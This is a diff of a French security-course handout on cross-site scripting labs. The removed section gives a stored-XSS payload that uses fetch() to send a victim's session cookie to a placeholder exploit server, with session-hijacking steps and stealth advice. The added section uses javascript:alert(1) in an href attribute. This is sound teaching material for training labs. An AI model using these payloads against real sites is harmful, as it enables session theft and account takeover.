@@ -236,72 +236,64 @@ Adapter l’encodage des données au contexte de développement :
 image::methodes_encodage_java.png[Méthodes d'encodage Java OWASP]
 |===
 
-
-
-== Challenge supplémentaire
-
-* **Nom du Lab PortSwigger :** _Exploiting cross-site scripting to steal cookies_
-
-https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
-
-* **Contexte :** Le site héberge un blog vulnérable à une faille **Stored XSS** dans la section des commentaires (similaire à l'empoisonnement de logs).
-* **Objectif :** Découvrir la faille, forger un payload d'exfiltration, voler le cookie de session de la victime (un administrateur qui consulte régulièrement les commentaires) et usurper son identité pour valider le lab.
+== Défi Supplémentaire : XSS Stocké via le pseudo-protocole JavaScript
 
 [NOTE]
-.Objectif Pédagogique
+.Objectif
 ====
-Ce laboratoire fait la transition parfaite vers des scénarios d'entreprise réels. Fini les simples `alert(1)` inoffensives : l'objectif est ici de monter une véritable attaque furtive permettant d'exfiltrer un cookie de session administrateur vers un serveur tiers, sans alerter la victime.
+Dans les défis précédents, nous avons vu que le serveur se protégeait souvent en transformant les chevrons `\&lt;` et `\&gt;` en entités HTML inoffensives. L'objectif de ce laboratoire est de vous prouver que cette protection est **insuffisante** si votre injection se situe dans l'attribut `href` d'un lien hypertexte.
 ====
 
-Contrairement aux premiers labs, vous disposez ici d'un bouton **"Go to exploit server"**. Cet outil simule un serveur contrôlé par l'attaquant (votre machine pirate). Il est l'équivalent du script `capture-data.php` que nous étudierons sur Mutillidae.
+=== Présentation du Challenge
 
-Ce serveur d'exploitation possède une adresse unique (ex: `https://exploit-XXXX.exploit-server.net`) et un fichier de logs (**Access log**) qui enregistre toutes les requêtes HTTP qu'il reçoit.
+* **Nom du Lab PortSwigger :** _Stored XSS into anchor href attribute with double quotes HTML-encoded_
 
+https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded
 
-== À vous de jouer (Étapes de l'attaque)
+* **Contexte :** Le site héberge un blog avec une section "Commentaires". Le formulaire permet aux utilisateurs de renseigner leur Nom, leur Email, leur Commentaire, mais aussi l'URL de leur **Site Web**.
+* **La faille :** Le nom de l'auteur du commentaire devient un lien cliquable pointant vers le Site Web qu'il a renseigné. L'application encode bien les chevrons, mais ne vérifie pas le format de l'URL.
 
-=== Étape 1 : Identifier la faille
-Rendez-vous sur un article du blog et testez le formulaire de commentaire. Vérifiez si l'application est vulnérable au Stored XSS en injectant un payload de test basique.
+=== À vous de jouer (Étapes de l'attaque)
 
-=== Étape 2 : Forger le payload d'exfiltration furtive
-Une fois la faille confirmée, vous devez créer un script qui va lire le `document.cookie` de la victime et l'envoyer discrètement vers votre **Exploit Server**.
+**Étape 1 : Analyser le comportement normal**
 
-Plutôt que d'utiliser `document.location` (qui redirigerait visiblement l'administrateur et éveillerait ses soupçons), vous utiliserez l'API `fetch()` pour effectuer une requête HTTP fantôme en arrière-plan.
-
-*Modèle de payload à adapter :*
-[source,html]
-----
-\&lt;script\&gt;
-fetch('https://VOTRE-ID-EXPLOIT-SERVER.exploit-server.net/log?cookie=' + btoa(document.cookie));
-\&lt;/script\&gt;
-----
-_(Note : La fonction `btoa()` permet d'encoder le cookie en Base64 pour éviter que des caractères spéciaux ne cassent l'URL)._
-
-=== Étape 3 : Empoisonner la base de données
-Postez un commentaire contenant votre payload final.
-
-NE PAS OUBLIER LA COPIE D'ECRAN
-
-=== Étape 4 : Intercepter le butin
-Rendez-vous sur votre **Exploit Server** et ouvrez les **Access logs**. Attendez quelques secondes (le temps que le bot administrateur consulte la page).
-Vous devriez voir apparaître une requête entrante contenant le cookie de session de la victime encodé dans l'URL !
+Rendez-vous sur un article du blog. Postez un commentaire inoffensif en remplissant le champ "Website" avec une URL classique (ex: `http://mon-site.com`).
+Une fois le commentaire posté, faites un clic droit sur votre nom d'auteur > "Inspecter" (ou utilisez l'onglet _Elements_ des outils de développement de votre navigateur).
+Constatez comment votre URL a été intégrée dans le code HTML. Elle se trouve dans l'attribut `href` d'une balise `\&lt;a\&gt;` :
+`\&lt;a href="http://mon-site.com"\&gt;Votre Nom\&lt;/a\&gt;`
 
 NE PAS OUBLIER LA COPIE D'ECRAN
 
 
-=== Étape 5 : Usurpation d'identité (Hijacking)
-Décodez le cookie (via le Decoder de BurpSuite).
-Retournez sur le site principal. Interceptez n'importe quelle requête avec BurpSuite (ou utilisez l'inspecteur de stockage de votre navigateur) et remplacez la valeur de votre propre cookie `session` par celle de l'administrateur.
-Rechargez la page : vous êtes désormais connecté en tant qu'administrateur !
+**Étape 2 : Tester les défenses du développeur**
+Postez un deuxième commentaire. Cette fois, dans le champ "Website", essayez de casser l'attribut en injectant des guillemets et des balises, par exemple :
+`" \&gt;\&lt;script\&gt;alert(1)\&lt;/script\&gt;`
+Inspectez à nouveau le résultat. Le développeur a bien fait son travail (partiellement) : les guillemets et les chevrons ont été encodés en entités HTML (`\&amp;quot;`, `\&amp;lt;`). La balise script est neutralisée.
+
+**Étape 3 : Le contournement (Le pseudo-protocole)**
+
+Puisque nous sommes déjà à l'intérieur d'un attribut `href` qui attend une URL, nous n'avons pas besoin de balises HTML ! Les navigateurs acceptent un format d'URL spécial appelé le **pseudo-protocole JavaScript**. Il permet d'exécuter du code au clic.
+Postez un troisième commentaire. Dans le champ "Website", insérez le payload suivant :
+`javascript:alert(1)`
 
 NE PAS OUBLIER LA COPIE D'ECRAN
 
 
-== 4. Question de Synthèse (À rédiger dans le compte-rendu)
+**Étape 4 : L'exécution**
+Faites défiler la page jusqu'à votre dernier commentaire.
+Cliquez simplement sur votre nom d'auteur.
+L'alerte JavaScript s'exécute ! Le défi est validé.
 
-**Question :** Dans ce laboratoire (tout comme dans le défi Mutillidae sur l'empoisonnement des logs), nous avons utilisé un serveur tiers pour exfiltrer les données.
+NE PAS OUBLIER LA COPIE D'ECRAN
 
-D'un point de vue "Red Team" (attaquant), expliquez pourquoi l'utilisation de l'API `fetch()` ou la création d'une image invisible (`new Image().src=...`) est stratégiquement bien plus dangereuse et efficace qu'une simple redirection via `document.location="http://serveur-pirate.com"` ?
+
+---
+
+=== Question de Synthèse (À rédiger dans le compte-rendu)
+
+**Question :** Lors de l'étape 2, nous avons vu que le développeur a correctement encodé les caractères dangereux (`\&lt;`, `\&gt;`, `"`). Pourtant, l'attaque a réussi à l'étape 4.
+
+Expliquez techniquement pourquoi l'encodage HTML standard ne protège pas contre cette attaque, et quelle devrait être la bonne pratique de développement pour sécuriser spécifiquement un champ attendant une URL (comme le champ "Site Web" ici) ?
 
 
 == Dossier documentaire
